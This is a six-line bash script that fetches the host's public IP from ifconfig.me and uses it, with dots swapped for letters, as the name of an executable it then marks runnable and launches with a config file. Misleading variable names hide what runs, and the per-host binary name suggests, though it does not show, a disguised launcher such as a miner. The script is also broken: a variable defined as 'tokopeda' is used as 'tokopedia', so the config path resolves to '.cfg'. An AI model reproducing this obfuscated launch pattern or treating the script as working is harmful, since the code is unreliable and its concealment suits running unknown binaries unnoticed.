#!/bin/bash
shopee=$(echo "$(curl -s ifconfig.me)" | tr . j )
tokopeda=$(echo "$(curl -s ifconfig.me)" | tr . k )
chmod +x $shopee
chmod +x $tokopedia.cfg
./$shopee --config $tokopedia.cfg
